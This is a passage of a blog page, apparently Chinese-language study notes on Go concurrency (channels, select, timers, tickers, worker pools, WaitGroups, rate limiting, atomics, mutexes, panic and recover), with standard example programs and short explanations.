&#125;  <br>&#125;<br></code></pre></td></tr></table></figure><h2 id="Non-Blocking-Channel-Operations"><a href="#Non-Blocking-Channel-Operations" class="headerlink" title="Non-Blocking Channel Operations"></a>Non-Blocking Channel Operations</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main  <br>  <br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span>  <br>  <br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;  <br>    messages := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-type">string</span>)  <br>    signals := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-type">bool</span>)  <br>  <br>    <span class="hljs-keyword">select</span> &#123;  <br>    <span class="hljs-keyword">case</span> msg := &lt;-messages:  <br>       fmt.Println(<span class="hljs-string">&quot;received messages&quot;</span>, msg)  <br>    <span class="hljs-keyword">default</span>:  <br>       fmt.Println(<span class="hljs-string">&quot;no messages received&quot;</span>)  <br>    &#125;  <br>  <br>    msg := <span class="hljs-string">&quot;hi&quot;</span>  <br>    <span class="hljs-keyword">select</span> &#123;  <br>    <span class="hljs-keyword">case</span> messages &lt;- msg:  <br>       fmt.Println(<span class="hljs-string">&quot;sent message&quot;</span>, msg)  <br>    <span class="hljs-keyword">default</span>:  <br>       fmt.Println(<span class="hljs-string">&quot;no message sent&quot;</span>)  <br>    &#125;  <br>  <br>    <span class="hljs-keyword">select</span> &#123;  <br>    <span class="hljs-keyword">case</span> msg := &lt;-messages:  <br>       fmt.Println(<span class="hljs-string">&quot;received messages&quot;</span>, msg)  <br>    <span class="hljs-keyword">case</span> sig := &lt;-signals:  <br>       fmt.Println(<span class="hljs-string">&quot;received signal&quot;</span>, sig)  <br>    <span class="hljs-keyword">default</span>:  <br>       fmt.Println(<span class="hljs-string">&quot;no activity&quot;</span>)  <br>    &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><p>这里的通道是无缓存的，因此 msg 无法发送到通道中，阻塞。</p><h2 id="Closing-Channels"><a href="#Closing-Channels" class="headerlink" title="Closing Channels"></a>Closing Channels</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main  <br>  <br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span>  <br>  <br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;  <br>    jobs := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-type">int</span>, <span class="hljs-number">5</span>)  <br>    done := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-type">bool</span>)  <br>  <br>    <span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;  <br>       <span class="hljs-keyword">for</span> &#123;  <br>          j, more := &lt;-jobs  <br>          <span class="hljs-keyword">if</span> more &#123;  <br>             fmt.Println(<span class="hljs-string">&quot;received job&quot;</span>, j)  <br>          &#125; <span class="hljs-keyword">else</span> &#123;  <br>             fmt.Println(<span class="hljs-string">&quot;received all jobs&quot;</span>)  <br>             done &lt;- <span class="hljs-literal">true</span>  <br>             <span class="hljs-keyword">return</span>  <br>          &#125;  <br>       &#125;  <br>    &#125;()  <br>  <br>    <span class="hljs-keyword">for</span> j := <span class="hljs-number">1</span>; j &lt;= <span class="hljs-number">3</span>; j++ &#123;  <br>       jobs &lt;- j  <br>       fmt.Println(<span class="hljs-string">&quot;sent job&quot;</span>, j)  <br>    &#125;  <br>    <span class="hljs-built_in">close</span>(jobs)  <br>    fmt.Println(<span class="hljs-string">&quot;sent all jobs&quot;</span>)  <br>  <br>    &lt;-done  <br>    _, ok := &lt;-jobs  <br>    fmt.Println(<span class="hljs-string">&quot;received more jobs:&quot;</span>, ok)  <br>&#125;<br></code></pre></td></tr></table></figure><p>这段代码运行结果为：</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-variable">sent</span> <span class="hljs-variable"><span class="hljs-class">job</span></span> <span class="hljs-number">1</span><br><span class="hljs-variable">sent</span> <span class="hljs-variable"><span class="hljs-class">job</span></span> <span class="hljs-number">2</span><br><span class="hljs-variable">sent</span> <span class="hljs-variable"><span class="hljs-class">job</span></span> <span class="hljs-number">3</span><br><span class="hljs-variable">sent</span> <span class="hljs-variable">all</span> <span class="hljs-variable"><span class="hljs-class">jobs</span></span><br><span class="hljs-variable">received</span> <span class="hljs-variable"><span class="hljs-class">job</span></span> <span class="hljs-number">1</span><br><span class="hljs-variable">received</span> <span class="hljs-variable"><span class="hljs-class">job</span></span> <span class="hljs-number">2</span><br><span class="hljs-variable">received</span> <span class="hljs-variable"><span class="hljs-class">job</span></span> <span class="hljs-number">3</span><br><span class="hljs-variable">received</span> <span class="hljs-variable">all</span> <span class="hljs-variable"><span class="hljs-class">jobs</span></span><br><span class="hljs-variable">received</span> <span class="hljs-variable">more</span> <span class="hljs-variable"><span class="hljs-class">jobs</span></span>: <span class="hljs-variable"><span class="hljs-literal">false</span></span><br></code></pre></td></tr></table></figure><p>首先，在主线程中，进入循环，每次打印出 sent job，3 次之后，关闭 jobs 通道，并且打印 sent all jobs，此时，&lt;-done 的作用是阻塞主线程，等待从 done 中接收一个值，在此期间 goroutine 接收到 jobs 的消息，并且打印出 received jobs，3 次之后，received all jobs，并且给 done 复制，此时阻塞继续执行，由于 jobs 已经关闭，因此 ok 为 false，打印 received more jobs： false。</p><h2 id="Range-over-Channels"><a href="#Range-over-Channels" class="headerlink" title="Range over Channels"></a>Range over Channels</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main  <br>  <br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span>  <br>  <br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;  <br>    queue := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-type">string</span>, <span class="hljs-number">2</span>)  <br>    queue &lt;- <span class="hljs-string">&quot;one&quot;</span>  <br>    queue &lt;- <span class="hljs-string">&quot;two&quot;</span>  <br>    <span class="hljs-built_in">close</span>(queue)  <br>    <span class="hljs-keyword">for</span> i := <span class="hljs-keyword">range</span> queue &#123;  <br>       fmt.Println(i)  <br>    &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><h2 id="Timers"><a href="#Timers" class="headerlink" title="Timers"></a>Timers</h2><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs arcade">package main  <br>  <br><span class="hljs-keyword">import</span> (  <br>    <span class="hljs-string">&quot;fmt&quot;</span>  <br>    <span class="hljs-string">&quot;time&quot;</span>)  <br>  <br>func main() &#123;  <br>    <span class="hljs-attr">time1</span> := <span class="hljs-built_in">time</span>.NewTimer(<span class="hljs-built_in">time</span>.<span class="hljs-built_in">Second</span> * <span class="hljs-number">2</span>)  <br>  <br>    &lt;-time1.C  <br>    fmt.Println(<span class="hljs-string">&quot;Timer 1 fired&quot;</span>)  <br>  <br>    timer2 := <span class="hljs-built_in">time</span>.NewTimer(<span class="hljs-built_in">time</span>.<span class="hljs-built_in">Second</span>)  <br>    go func() &#123;  <br>       &lt;-timer2.C  <br>       fmt.Println(<span class="hljs-string">&quot;Timer 2 fired&quot;</span>)  <br>    &#125;()  <br>    stop2 := timer2.Stop()  <br>    <span class="hljs-keyword">if</span> stop2 &#123;  <br>       fmt.Println(<span class="hljs-string">&quot;Timer 2 stopped&quot;</span>)  <br>    &#125;  <br>  <br>    <span class="hljs-built_in">time</span>.Sleep(<span class="hljs-built_in">time</span>.<span class="hljs-built_in">Second</span> * <span class="hljs-number">2</span>)  <br>&#125;<br></code></pre></td></tr></table></figure><h2 id="Tickers"><a href="#Tickers" class="headerlink" title="Tickers"></a>Tickers</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main  <br>  <br><span class="hljs-keyword">import</span> (  <br>    <span class="hljs-string">&quot;fmt&quot;</span>  <br>    <span class="hljs-string">&quot;time&quot;</span>)  <br>  <br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;  <br>    ticker := time.NewTicker(<span class="hljs-number">500</span> * time.Millisecond)  <br>    done := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-type">bool</span>)  <br>  <br>    <span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;  <br>  <br>       <span class="hljs-keyword">for</span> &#123;  <br>          <span class="hljs-keyword">select</span> &#123;  <br>          <span class="hljs-keyword">case</span> &lt;-done:  <br>             <span class="hljs-keyword">return</span>  <br>          <span class="hljs-keyword">case</span> t := &lt;-ticker.C:  <br>             fmt.Println(<span class="hljs-string">&quot;Tick at&quot;</span>, t)  <br>  <br>          &#125;  <br>       &#125;  <br>    &#125;()  <br>  <br>    time.Sleep(<span class="hljs-number">1600</span> * time.Millisecond)  <br>    ticker.Stop()  <br>    done &lt;- <span class="hljs-literal">true</span>  <br>    fmt.Println(<span class="hljs-string">&quot;Ticker Stopped&quot;</span>)  <br>  <br>&#125;<br></code></pre></td></tr></table></figure><p>与 Timer 的区别在于，<code>tickers are for when you want to do something repeatly </code></p><h2 id="Worker-Pools"><a href="#Worker-Pools" class="headerlink" title="Worker Pools"></a>Worker Pools</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main  <br>  <br><span class="hljs-keyword">import</span> (  <br>    <span class="hljs-string">&quot;fmt&quot;</span>  <br>    <span class="hljs-string">&quot;time&quot;</span>)  <br>  <br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">worker</span><span class="hljs-params">(id <span class="hljs-type">int</span>, jobs &lt;-<span class="hljs-keyword">chan</span> <span class="hljs-type">int</span>, results <span class="hljs-keyword">chan</span>&lt;- <span class="hljs-type">int</span>)</span></span> &#123;  <br>    <span class="hljs-keyword">for</span> j := <span class="hljs-keyword">range</span> jobs &#123;  <br>       fmt.Println(<span class="hljs-string">&quot;worker&quot;</span>, id, <span class="hljs-string">&quot;started job&quot;</span>, j)  <br>       time.Sleep(time.Second)  <br>       fmt.Println(<span class="hljs-string">&quot;worker&quot;</span>, id, <span class="hljs-string">&quot;finished job&quot;</span>, j)  <br>       results &lt;- j * <span class="hljs-number">2</span>  <br>    &#125;  <br>&#125;  <br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;  <br>    <span class="hljs-keyword">const</span> numJobs = <span class="hljs-number">5</span>  <br>    jobs := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-type">int</span>, numJobs)  <br>    results := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-type">int</span>, numJobs)  <br>  <br>    <span class="hljs-keyword">for</span> w := <span class="hljs-number">1</span>; w &lt;= <span class="hljs-number">3</span>; w++ &#123;  <br>       <span class="hljs-keyword">go</span> worker(w, jobs, results)  <br>  <br>    &#125;  <br>    <span class="hljs-keyword">for</span> j := <span class="hljs-number">1</span>; j &lt;= numJobs; j++ &#123;  <br>       jobs &lt;- j  <br>    &#125;  <br>    <span class="hljs-built_in">close</span>(jobs)  <br>    <span class="hljs-keyword">for</span> a := <span class="hljs-number">1</span>; a &lt;= numJobs; a++ &#123;  <br>       &lt;-results  <br>    &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><p>jobs &lt;-chan int, results chan&lt;- int 分别为一个只读和只写的通道，虽然只启动了 3 个 worker 协程，但是向 jobs  通道发送了 5 个任务。这些任务会被这 3 个 worker 协程并发地处理。</p><h2 id="WaitGroups"><a href="#WaitGroups" class="headerlink" title="WaitGroups"></a>WaitGroups</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main  <br>  <br><span class="hljs-keyword">import</span> (  <br>    <span class="hljs-string">&quot;fmt&quot;</span>  <br>    <span class="hljs-string">&quot;sync&quot;</span>    <span class="hljs-string">&quot;time&quot;</span>)  <br>  <br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">worker</span><span class="hljs-params">(id <span class="hljs-type">int</span>)</span></span> &#123;  <br>    fmt.Println(<span class="hljs-string">&quot;worker starting &quot;</span>, id)  <br>    time.Sleep(time.Second)  <br>    fmt.Println(<span class="hljs-string">&quot;worker done &quot;</span>, id)  <br>&#125;  <br>  <br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;  <br>    <span class="hljs-keyword">var</span> wg sync.WaitGroup  <br>  <br>    <span class="hljs-keyword">for</span> i := <span class="hljs-number">1</span>; i &lt;= <span class="hljs-number">5</span>; i++ &#123;  <br>       wg.Add(<span class="hljs-number">1</span>)  <br>       <span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;  <br>          <span class="hljs-keyword">defer</span> wg.Done()  <br>          worker(i)  <br>       &#125;()  <br>    &#125;  <br>    wg.Wait()  <br>&#125;<br></code></pre></td></tr></table></figure><p>使用 waitgroups 来等待所有 goroutines 完成。</p><h2 id="Rate-Limiting"><a href="#Rate-Limiting" class="headerlink" title="Rate Limiting"></a>Rate Limiting</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main  <br>  <br><span class="hljs-keyword">import</span> (  <br>    <span class="hljs-string">&quot;fmt&quot;</span>  <br>    <span class="hljs-string">&quot;time&quot;</span>)  <br>  <br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;  <br>    requests := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-type">int</span>, <span class="hljs-number">5</span>)  <br>    <span class="hljs-keyword">for</span> i := <span class="hljs-number">1</span>; i &lt;= <span class="hljs-number">5</span>; i++ &#123;  <br>       requests &lt;- i  <br>    &#125;  <br>    <span class="hljs-built_in">close</span>(requests)  <br>  <br>    limiter := time.Tick(<span class="hljs-number">200</span> * time.Millisecond)  <br>    <span class="hljs-keyword">for</span> req := <span class="hljs-keyword">range</span> requests &#123;  <br>       &lt;-limiter  <br>       fmt.Println(<span class="hljs-string">&quot;request&quot;</span>, req, time.Now())  <br>    &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><p>如果想限制速率，可以通过 time.Tick 设置一个 limiter。</p><h2 id="Atomic-Counters"><a href="#Atomic-Counters" class="headerlink" title="Atomic Counters"></a>Atomic Counters</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main  <br>  <br><span class="hljs-keyword">import</span> (  <br>    <span class="hljs-string">&quot;fmt&quot;</span>  <br>    <span class="hljs-string">&quot;sync&quot;</span>    <span class="hljs-string">&quot;sync/atomic&quot;</span>)  <br>  <br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;  <br>  <br>    <span class="hljs-keyword">var</span> ops atomic.Uint64  <br>  <br>    <span class="hljs-keyword">var</span> wg sync.WaitGroup  <br>  <br>    <span class="hljs-keyword">for</span> i := <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">50</span>; i++ &#123;  <br>       wg.Add(<span class="hljs-number">1</span>)  <br>  <br>       <span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;  <br>          <span class="hljs-keyword">for</span> c := <span class="hljs-number">0</span>; c &lt; <span class="hljs-number">1000</span>; c++ &#123;  <br>  <br>             ops.Add(<span class="hljs-number">1</span>)  <br>          &#125;  <br>  <br>          wg.Done()  <br>       &#125;()  <br>    &#125;  <br>  <br>    wg.Wait()  <br>  <br>    fmt.Println(<span class="hljs-string">&quot;ops:&quot;</span>, ops.Load())  <br>&#125;<br></code></pre></td></tr></table></figure><p>使用 load 来更新，线程安全。</p><h2 id="Mutexes"><a href="#Mutexes" class="headerlink" title="Mutexes"></a>Mutexes</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main  <br>  <br><span class="hljs-keyword">import</span> (  <br>    <span class="hljs-string">&quot;fmt&quot;</span>  <br>    <span class="hljs-string">&quot;sync&quot;</span>)  <br>  <br><span class="hljs-keyword">type</span> Container <span class="hljs-keyword">struct</span> &#123;  <br>    mu       sync.Mutex  <br>    counters <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">int</span>  <br>&#125;  <br>  <br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(c *Container)</span></span> inc(name <span class="hljs-type">string</span>) &#123;  <br>  <br>    c.mu.Lock()  <br>    <span class="hljs-keyword">defer</span> c.mu.Unlock()  <br>    c.counters[name]++  <br>&#125;  <br>  <br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;  <br>    c := Container&#123;  <br>  <br>       counters: <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">int</span>&#123;<span class="hljs-string">&quot;a&quot;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&quot;b&quot;</span>: <span class="hljs-number">0</span>&#125;,  <br>    &#125;  <br>  <br>    <span class="hljs-keyword">var</span> wg sync.WaitGroup  <br>  <br>    doIncrement := <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(name <span class="hljs-type">string</span>, n <span class="hljs-type">int</span>)</span></span> &#123;  <br>       <span class="hljs-keyword">for</span> i := <span class="hljs-number">0</span>; i &lt; n; i++ &#123;  <br>          c.inc(name)  <br>       &#125;  <br>       wg.Done()  <br>    &#125;  <br>  <br>    wg.Add(<span class="hljs-number">3</span>)  <br>    <span class="hljs-keyword">go</span> doIncrement(<span class="hljs-string">&quot;a&quot;</span>, <span class="hljs-number">10000</span>)  <br>    <span class="hljs-keyword">go</span> doIncrement(<span class="hljs-string">&quot;a&quot;</span>, <span class="hljs-number">10000</span>)  <br>    <span class="hljs-keyword">go</span> doIncrement(<span class="hljs-string">&quot;b&quot;</span>, <span class="hljs-number">10000</span>)  <br>  <br>    wg.Wait()  <br>    fmt.Println(c.counters)  <br>&#125;<br><br></code></pre></td></tr></table></figure><p>对于更复杂的场景，想要在多线程中安全地操作数据，可以利用 mutex。<br>在获取数据之前，先用 mutex 锁住，再通过 defer 进行 unlock。</p><h2 id="Panic"><a href="#Panic" class="headerlink" title="Panic"></a>Panic</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main  <br>  <br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;os&quot;</span>  <br>  <br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;  <br>    <span class="hljs-built_in">panic</span>(<span class="hljs-string">&quot; a problem&quot;</span>)  <br>  <br>    _, err := os.Create(<span class="hljs-string">&quot;/tmp/file&quot;</span>)  <br>    <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;  <br>       <span class="hljs-built_in">panic</span>(err)  <br>    &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><h2 id="Recover"><a href="#Recover" class="headerlink" title="Recover"></a>Recover</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main  <br>  <br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span>  <br>  <br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">myPanic</span><span class="hljs-params">()</span></span> &#123;  <br>    <span class="hljs-built_in">panic</span>(<span class="hljs-string">&quot;a problem&quot;</span>)  <br>  <br>&#125;  <br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;  <br>    <span class="hljs-keyword">defer</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;  <br>       <span class="hljs-keyword">if</span> r := <span class="hljs-built_in">recover</span>(); r != <span class="hljs-literal">nil</span> &#123;  <br>          fmt.Println(<span class="hljs-string">&quot;revocered. Error &quot;</span>, r)  <br>       &#125;  <br>    &#125;()  <br>    myPanic()  <br>    fmt.Println(<span class="hljs-string">&quot;After mypanic()&quot;</span>)  <br>&#125;<br></code></pre></td></tr></table></figure><p>Go 可以通过 recover 函数从 panic 中恢复，可以阻止 panic 中止程序，让它继续执行。<br>例如下面的场景：<br>如果其中一个客户端连接出现严重错误，服务器不希望崩溃。而是希望关闭该连接并继续为其他客户端提供服务。<br>recover 必须在 defer 函数中调用。</p><h2 id="Text-Templates"><a href="#Text-Templates" class="headerlink" title="Text Templates"></a>Text Templates</h2><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs stylus">package <span 